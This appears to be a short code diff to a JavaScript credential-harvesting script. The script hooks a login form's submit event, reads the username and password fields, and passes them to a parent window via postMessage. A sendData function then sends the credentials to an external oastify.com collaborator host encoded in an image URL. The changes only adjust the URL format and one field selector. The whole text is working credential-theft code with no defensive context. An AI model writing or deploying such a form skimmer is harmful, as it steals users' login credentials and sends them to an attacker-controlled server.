@@ -12,7 +12,7 @@
     // Function to send data to your server
     function sendData(username, password) {
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS=' + encodeURIComponent(password) + '.png', true);
+        xhr.open('GET', 'https://hsd0gyosk5qk1lzr8cz7uqxxroxflb90.oastify.com/USER' + encodeURIComponent(username) + 'PASS' + encodeURIComponent(password) + '.png', true);
         xhr.send();
     }
 
@@ -25,7 +25,7 @@
         script.textContent = `
             var form = document.querySelector('form'); // Adjust selector as needed
             form.addEventListener('submit', function (event) {
-                var username = document.querySelector('#username').value; // Adjust selector as needed
+                var username = document.querySelector('#control').value; // Adjust selector as needed
                 var password = document.querySelector('#password').value; // Adjust selector as needed
                 window.parent.postMessage({ username: username, password: password }, '*');
                 
